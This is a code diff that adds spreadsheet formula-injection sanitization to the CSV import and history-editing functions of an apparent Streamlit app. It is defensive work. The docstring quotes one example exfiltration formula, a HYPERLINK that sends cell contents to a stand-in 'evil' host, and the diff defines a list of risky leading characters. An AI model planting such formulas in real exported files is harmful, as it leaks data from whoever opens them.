@@ -21,6 +21,28 @@ _HISTORY_KEY = "search_history_entries"
 _NEXT_ID_KEY = "search_history_next_id"
 _COLUMNS = ["id", "timestamp", "query", "top_material", "confidence", "est_cost", "volume", "units", "num_results"]
 
+# Leading characters a spreadsheet application (Excel, LibreOffice,
+# Google Sheets) interprets as the start of a live formula.
+_RISKY_LEADING_CHARS = ("=", "+", "-", "@", "\t", "\r")
+
+
+def _sanitize_cell(value):
+    """Neutralize spreadsheet formula injection (a.k.a. CSV/Excel
+    Injection, OWASP-catalogued): text that reaches history through an
+    uploaded CSV (import_history_csv) or hand-typed into the data
+    editor (save_history_changes) is untrusted, and this app's own
+    Export as CSV/Excel buttons will later write it straight back out.
+    A value like =HYPERLINK("http://evil/?"&A1,"click") would sit
+    inert in this app, but could execute as a real formula the moment
+    someone opens that exported file in a spreadsheet program. A
+    leading apostrophe is the standard mitigation — spreadsheet apps
+    treat it as "force this cell to plain text", so the value still
+    displays correctly and never runs as a formula."""
+    text = str(value)
+    if text and text[0] in _RISKY_LEADING_CHARS:
+        return "'" + text
+    return text
+
 
 def init_history():
     if _HISTORY_KEY not in st.session_state:
@@ -81,13 +103,13 @@ def save_history_changes(edited_df):
     for _, row in edited_df.iterrows():
         entries.append({
             "id": _next_id(),
-            "timestamp": str(row.get("Timestamp") or datetime.now().strftime("%Y-%m-%d %H:%M:%S")),
-            "query": str(row.get("Query") or "Manual Entry"),
-            "top_material": str(row.get("Top Material") or "N/A"),
-            "confidence": str(row.get("Confidence") or "N/A"),
-            "est_cost": str(row.get("Est. Cost") or "N/A"),
+            "timestamp": _sanitize_cell(row.get("Timestamp") or datetime.now().strftime("%Y-%m-%d %H:%M:%S")),
+            "query": _sanitize_cell(row.get("Query") or "Manual Entry"),
+            "top_material": _sanitize_cell(row.get("Top Material") or "N/A"),
+            "confidence": _sanitize_cell(row.get("Confidence") or "N/A"),
+            "est_cost": _sanitize_cell(row.get("Est. Cost") or "N/A"),
             "volume": float(row.get("Volume") or 0.0),
-            "units": str(row.get("Units") or "Metric"),
+            "units": _sanitize_cell(row.get("Units") or "Metric"),
             "num_results": int(row.get("# Results") or 0),
         })
     st.session_state[_HISTORY_KEY] = entries
@@ -101,13 +123,13 @@ def import_history_csv(df, mode="append"):
     for _, row in df.iterrows():
         st.session_state[_HISTORY_KEY].append({
             "id": _next_id(),
-            "timestamp": str(row.get("Timestamp") or datetime.now().strftime("%Y-%m-%d %H:%M:%S")),
-            "query": str(row.get("Query") or "Imported Entry"),
-            "top_material": str(row.get("Top Material") or "N/A"),
-            "confidence": str(row.get("Confidence") or "N/A"),
-            "est_cost": str(row.get("Est. Cost") or "N/A"),
+            "timestamp": _sanitize_cell(row.get("Timestamp") or datetime.now().strftime("%Y-%m-%d %H:%M:%S")),
+            "query": _sanitize_cell(row.get("Query") or "Imported Entry"),
+            "top_material": _sanitize_cell(row.get("Top Material") or "N/A"),
+            "confidence": _sanitize_cell(row.get("Confidence") or "N/A"),
+            "est_cost": _sanitize_cell(row.get("Est. Cost") or "N/A"),
             "volume": float(row.get("Volume") or 0.0),
-            "units": str(row.get("Units") or "Metric"),
+            "units": _sanitize_cell(row.get("Units") or "Metric"),
             "num_results": int(row.get("# Results") or 0),
         })
 
